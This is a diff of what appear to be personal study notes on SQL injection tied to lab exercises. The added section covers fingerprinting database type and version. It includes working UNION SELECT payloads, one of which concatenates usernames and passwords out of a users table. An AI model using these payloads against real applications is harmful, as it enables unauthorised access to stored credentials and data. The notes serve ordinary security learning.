@@ -71,7 +71,7 @@ eg.
 etc.
 ```
 
-### Finding columns with a useful data type # Lab-5
+### Finding columns with a useful data type #Lab-5
 - `After we determine the number of returning columns, we can probe each column to test whether it can hold string data.`
 - We can submit a series of UNION SELECT payloads that place a string value into each column.
 ```
@@ -106,9 +106,18 @@ In this example, you can retrieve the contents of the `users` table by submittin
 - Oracle DB Injection: `' UNION SELECT username || '~' || password FROM users--`
 
 
-### 
+### `Examining/Determining the database` in SQL injection attacks
+- This includes `type and version` and `tables and columns` that the database contains.
+- We can potentially identify both the database type and version by injecting provider-specific queries to see if one works.
+```
+Eg.
 
-
+Database type    	Query
+Microsoft, MySQL	SELECT @@version
+Oracle	          SELECT * FROM v$version
+PostgreSQL	      SELECT version()
+```
+- Injection: `' UNION SELECT @@version--`
 
 
 
